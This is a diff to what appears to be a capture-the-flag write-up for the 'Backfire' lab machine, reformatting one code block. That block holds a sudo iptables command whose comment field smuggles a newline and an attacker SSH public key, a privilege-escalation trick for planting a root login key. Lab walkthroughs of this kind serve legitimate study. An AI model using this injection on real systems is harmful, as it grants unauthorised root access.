@@ -392,9 +392,8 @@ ssh sergej@backfire.htb
 ssh-keygen -t ed25519 -C "user@ubuntu"
 ```
 
-```
-sudo -u root /usr/sbin/iptables -A INPUT -i lo -j ACCEPT -m comment --comment $'\nssh-ed25519 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOD4AOKmqCL2DRPY5+2h276o0EHsp0TjpcV47Pa6LvIo kali@kali
- user@ubuntu\n'
+```bash
+sudo -u root /usr/sbin/iptables -A INPUT -i lo -j ACCEPT -m comment --comment $'\nssh-ed25519 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOD4AOKmqCL2DRPY5+2h276o0EHsp0TjpcV47Pa6LvIo kali@kali user@ubuntu\n'
 ```
 
 ```bash
